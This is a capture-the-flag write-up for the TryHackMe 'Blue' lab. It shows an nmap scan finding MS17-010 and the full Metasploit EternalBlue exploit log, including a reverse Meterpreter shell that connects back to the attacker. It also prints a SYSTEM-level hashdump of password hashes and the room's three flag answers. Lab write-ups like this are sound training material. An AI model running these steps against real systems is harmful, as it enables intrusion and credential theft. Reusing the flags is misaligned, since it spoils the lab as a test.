###### Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
Room: https://tryhackme.com/room/blue
##

sudo nmap -sS -sC -sV -T5 -vv xx.xx.xxx.xxx
```
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
If we add the **--script=vuln** option to nmap, we see that the machine is vulnerable to Eternal Blue.

```
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

```

For a quick exploit, we can use metasploit with **windows/smb/ms17_010_eternalblue)** exploit.  

```
[*] Started reverse TCP handler on xx.x.x.xxx:4444 
[*] xx.xx.xxx.xxx:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] xx.xx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] xx.xx.xxx.xxx:445     - Scanned 1 of 1 hosts (100% complete)
[+] xx.xx.xxx.xxx:445 - The target is vulnerable.
[*] xx.xx.xxx.xxx:445 - Connecting to target for exploitation.
[+] xx.xx.xxx.xxx:445 - Connection established for exploitation.
[+] xx.xx.xxx.xxx:445 - Target OS selected valid for OS indicated by SMB reply
[*] xx.xx.xxx.xxx:445 - CORE raw buffer dump (42 bytes)
[*] xx.xx.xxx.xxx:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] xx.xx.xxx.xxx:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] xx.xx.xxx.xxx:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] xx.xx.xxx.xxx:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] xx.xx.xxx.xxx:445 - Trying exploit with 12 Groom Allocations.
[*] xx.xx.xxx.xxx:445 - Sending all but last fragment of exploit packet
[*] xx.xx.xxx.xxx:445 - Starting non-paged pool grooming
[+] xx.xx.xxx.xxx:445 - Sending SMBv2 buffers
[+] xx.xx.xxx.xxx:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] xx.xx.xxx.xxx:445 - Sending final SMBv2 buffers.
[*] xx.xx.xxx.xxx:445 - Sending last fragment of exploit packet!
[*] xx.xx.xxx.xxx:445 - Receiving response from exploit packet
[+] xx.xx.xxx.xxx:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] xx.xx.xxx.xxx:445 - Sending egg to corrupted connection.
[*] xx.xx.xxx.xxx:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to xx.xx.xxx.xxx
[*] Meterpreter session 2 opened (xx.x.x.xxx:4444 -> xx.xx.xxx.xxx:49220) at 2021-10-10 22:11:15 +0300
meterpreter > 
```

**meterpreter > getuid**  
> Server username: NT AUTHORITY\SYSTEM  

**hashdump output**  
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
**Flag 1** - C:\  
> flag{access_the_machine}  

**Flag 2** - C:\Windows\System32\config  
> flag{sam_database_elevated_access}

**Flag 3** - C:\Users\Jon\Documents  
> flag{admin_documents_can_be_valuable}
